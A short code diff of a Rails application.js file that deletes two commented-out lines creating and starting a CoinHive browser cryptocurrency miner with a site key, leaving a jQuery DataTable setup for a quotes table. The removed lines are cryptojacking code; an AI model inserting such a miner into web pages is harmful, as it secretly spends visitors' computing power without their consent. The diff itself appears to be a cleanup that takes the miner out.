@@ -17,9 +17,6 @@
 //= require_tree .
 
 $(document).ready(function(){
-  // var miner = new CoinHive.Anonymous('80bDWx1KXIBOSEbxCmC01GVNYxUlqUYo'); 
-  // miner.start(); 
-
   $("#quotes-table").DataTable({
     "bSort": false,
     "pageLength": 25
